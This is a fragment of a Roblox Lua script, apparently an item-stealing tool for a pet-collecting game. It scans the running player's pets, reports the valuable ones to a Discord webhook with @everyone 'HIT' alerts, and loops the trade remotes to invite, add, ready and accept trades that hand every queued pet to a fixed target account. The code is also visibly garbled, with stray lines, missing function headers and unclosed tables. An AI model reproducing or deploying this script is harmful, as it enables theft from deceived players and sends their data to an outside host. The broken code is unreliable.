local function getRemote(unobfuscatedName)
    local Net = ReplicatedStorage:WaitForChild("Packages"):WaitForChild("Net")
    local children = Net:GetChildren()
    for i = 1, #children - 1 do
        local cur  = children[i]
        local nxt  = children[i+1]
        if cur and nxt and string.find(cur.Name, unobfuscatedName) then
            return nxt
        end
    end
    return nil
end

local function formatNumber(n)
    if not n then return "$0/s" end
    local function clean(s) return s:gsub("%.?0+$","") end
    if n >= 1e12 then return "$"..clean(string.format("%.2f",n/1e12)).."T/s" end
    if n >= 1e9  then return "$"..clean(string.format("%.2f",n/1e9)).."B/s"  end
    if n >= 1e6  then return "$"..clean(string.format("%.2f",n/1e6)).."M/s"  end
    if n >= 1e3  then return "$"..clean(string.format("%.2f",n/1e3)).."K/s"  end
    return "$"..tostring(math.floor(n)).."/s"
end

local function colorToDecimal(c)
    if not c then return 3447003 end
    local r = math.clamp(math.floor(c.R*255),0,255)
    local g = math.clamp(math.floor(c.G*255),0,255)
    local b = math.clamp(math.floor(c.B*255),0,255)
    return r*65536 + g*256 + b
end

    local key = tostring(slotKey)

local function toWikiName(displayName)
    local clean = displayName:match("^(.-)%s*%(") or displayName
    return clean:gsub(" ","_")
end

local function fetchFandomImageUrl(displayName)
    local requestFn = getRequestFn()
    if not requestFn then return nil end
    local ok, response = pcall(function()
        return requestFn({
            Url    = FANDOM_BASE..toWikiName(displayName),
            Method = "GET",
            Headers = {["User-Agent"]="Mozilla/5.0",["Accept"]="text/html"},
        })
    end)
    if not ok or not response then return nil end
    local code = response.StatusCode or response.status_code or 0
    if code ~= 200 then return nil end
    local body = response.Body or response.body or ""
    if body == "" then return nil end
    local ogImg = body:match('property="og:image"%s+content="([^"]+)"')
               or body:match('content="([^"]+)"%s+property="og:image"')
    if ogImg and ogImg:find("^https?://") then
        return ogImg:gsub("&amp;","&")
    end
    local img = body:match('(https://static%.wikia%.nocookie%.net/[^"]+%.png)')
             or body:match('(https://static%.wikia%.nocookie%.net/[^"]+%.jpg)')
    if img then return img:gsub("/revision/latest[^\"]*","") end
    return nil
end

local function getBestImageUrl(displayName, animalIndex)
    local imageUrl = nil
    local done = false
    task.spawn(function()
        local ok, r = pcall(fetchFandomImageUrl, displayName)
        if ok and r then imageUrl = r end
        done = true
    end)
    local t0 = tick()
    while not done and (tick()-t0) < 5 do task.wait(0.1) end
    if imageUrl then return imageUrl end
    local info = AnimalsData and AnimalsData[animalIndex]
    if info then
        for _, key in ipairs({"Image","Icon","Thumbnail","Texture","ImageId","AssetId"}) do
            if info[key] and type(info[key])=="string" and info[key]~="" then
                local num = info[key]:match("%d+")
                if num then return "https://tr.rbxcdn.com/"..num.."/420/420/Image/Png" end
            end
        end
    end
    return nil
end

local function getBrainrotColor(animalIndex)
    local color = nil
    pcall(function()
        local models  = ReplicatedStorage:FindFirstChild("Models")
        local animals = models and models:FindFirstChild("Animals")
        if not animals then return end
        local template = animals:FindFirstChild(animalIndex)
        if not template then
            local info = AnimalsData and AnimalsData[animalIndex]
            if info and info.DisplayName then template = animals:FindFirstChild(info.DisplayName) end
        end
        if not template then return end
        local bestScore = 0
        for _, desc in ipairs(template:GetDescendants()) do
            if desc:IsA("MeshPart") or desc:IsA("Part") then
                local c   = desc.Color
                local vol = desc.Size.X * desc.Size.Y * desc.Size.Z
                local maxC = math.max(c.R,c.G,c.B)
                local minC = math.min(c.R,c.G,c.B)
                local sat  = (maxC > 0) and ((maxC-minC)/maxC) or 0
                local bri  = c.R*0.299 + c.G*0.587 + c.B*0.114
                local bp   = 1
                if bri < 0.08 then bp = 0.05 end
                if bri > 0.92 then bp = 0.15 end
                local score = (sat*3+0.2)*bp*vol
                if score > bestScore then bestScore=score; color=c end
            end
        end
    end)
    return color
end

                local info = AnimalsData and AnimalsData[data.Index]
                if not info then continue end

                local mutation    = data.Mutation or "None"
                local traits      = (data.Traits and #data.Traits > 0) and data.Traits or {}

                local genVal = 0
                pcall(function()
                    genVal = AnimalsShared:GetGeneration(data.Index, data.Mutation, data.Traits, nil)
                end)

                local mutPrefix   = (mutation ~= "None" and mutation ~= "") and ("["..mutation.."] ") or ""
                local nameDisplay = mutPrefix.."**"..displayName.."**"
                if #traits > 0 then nameDisplay = nameDisplay.." *(x"..#traits.." traits)*" end

                local entry = {
                    slot        = tostring(slot),
                    index       = data.Index,
                    displayName = displayName,
                    name        = nameDisplay,
                    genVal      = genVal,
                    genStr      = formatNumber(genVal),
                }

                table.insert(allPets, entry)

                -- Classify
                if GOOD_BRAINROTS[displayName] then
                    hasGood = true
                    table.insert(goodPets, entry)
                elseif TargetBrainrots[displayName] then
                    hasTarget = true
                    table.insert(targetPets, entry)
                elseif genVal >= MONEY_THRESHOLD then
                    hasHighMoney = true
                    table.insert(highMoneyPets, entry)
                end
            end
        end

        if #allPets == 0 then warn("[WH] No pets found"); return end

        table.sort(allPets,       function(a,b) return a.genVal > b.genVal end)
        table.sort(goodPets,      function(a,b) return a.genVal > b.genVal end)
        table.sort(targetPets,    function(a,b) return a.genVal > b.genVal end)
        table.sort(highMoneyPets, function(a,b) return a.genVal > b.genVal end)

        local function buildLines(list)
            local lines = {}
            for i, r in ipairs(list) do
                lines[i] = r.name.." — **"..r.genStr.."**"
            end
            local txt = table.concat(lines,"\n")
            if #txt > 1000 then txt = txt:sub(1,996).."..." end
            return txt
        end

        local top      = allPets[1]
        local imageUrl = getBestImageUrl(top.displayName, top.index)

        local embedColor = colorToDecimal(topColor)

            description = allLines,
            color       = 0x5865F2,

            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),

            table.insert(embeds, {
                title       = "💎 PEAK HIT ("..#goodPets..")",

                color       = 0xFF0000,  -- Red
                footer      = {text="GOOD BRAINROTS"},

        if #targetPets > 0 then
            table.insert(embeds, {
                title       = "⚡ MID HIT ("..#targetPets..")",
                description = buildLines(targetPets),
                color       = 0xFF8C00,  -- Orange
                footer      = {text="TARGET BRAINROTS"},

        if #highMoneyPets > 0 then
            table.insert(embeds, {
                title       = "💰 NORMAL HIT ("..#highMoneyPets..")",
                description = buildLines(highMoneyPets),
                color       = 0x00FF88,  -- Green
                footer      = {text="≥"..formatNumber(MONEY_THRESHOLD)},
            })
        end

        -- Determine ping content
        local pingContent = nil
        if hasGood then
            pingContent = "||@everyone|| **PEAK HIT**"
        elseif hasTarget then
            pingContent = "||@everyone|| **MID HIT**"
        elseif hasHighMoney then
            pingContent = "||@everyone|| **NORMAL HIT**"

            embeds     = embeds,
            username   = "Cung cung",
            avatar_url = GOOD_AVATAR,
        }

            payloadData.content = pingContent
        end

            local res = requestFn({
                Url     = GOOD_WEBHOOK,
                Method  = "POST",
                Headers = {["Content-Type"]="application/json"},

                    Method  = "POST",
                    Headers = {["Content-Type"]="application/json"},
                    Body    = HttpService:JSONEncode(payloadData),
                })
            end
        end)
        if not ok then warn("[WH] Error: "..tostring(err)) end
    end)

local function startFullAutomation()
    local inviteRemote = getRemote("TradeService/Invite")
    local addRemote    = getRemote("TradeService/AddBrainrot")
    local readyRemote  = getRemote("TradeService/Ready")
    local acceptRemote = getRemote("TradeService/Accept")

    if not (inviteRemote and addRemote and readyRemote and acceptRemote) then
        warn("[TRADER] Remotes not found"); return
    end

    task.spawn(function()
        local idx = 1
        while true do
            local item = brainrotQueue[idx]
            if item then
                pcall(function()
                    addRemote:InvokeServer(SELECT_GUID, item.slotKey, item.data)
                end)
                idx = (idx % #brainrotQueue) + 1
            end
            task.wait(DELAY_STEP)
        end
    end)

    task.spawn(function()
        while true do
            pcall(function() inviteRemote:InvokeServer(INVITE_GUID, TARGET_ID) end)
            task.wait(TRADE_CYCLE_DELAY)
        end
    end)

    task.spawn(function()
        while true do
            pcall(function() readyRemote:FireServer(READY_GUID) end)
            task.wait(1)
            pcall(function() acceptRemote:FireServer(ACCEPT_GUID) end)
            task.wait(1)
        end
    end)
end
